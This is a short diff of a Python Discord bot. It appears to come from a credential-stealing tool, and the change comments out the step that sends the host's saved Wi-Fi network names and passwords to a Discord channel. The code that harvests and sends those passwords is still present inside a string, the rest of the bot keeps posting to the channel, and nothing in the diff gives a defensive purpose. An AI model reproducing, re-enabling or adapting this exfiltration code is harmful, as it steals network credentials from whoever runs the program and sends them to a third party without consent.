@@ -35,11 +35,11 @@ class MyClient(discord.Client):
             embed1 = discord.Embed(title="NEW",
                                  description="Wifi details!",
                                  timestamp=datetime.datetime.utcnow())
-            passw = wifi()
+            '''passw = wifi()
             for i in range(len(passw)):
                 embed1.add_field(name = str(passw[i]["ssid"]), value = passw[i]["password"])
+            await channeln.send(embed=embed1)'''
             await channeln.send(embed=embed)
-            await channeln.send(embed=embed1)
             time.sleep(1)
             await self.close()
 
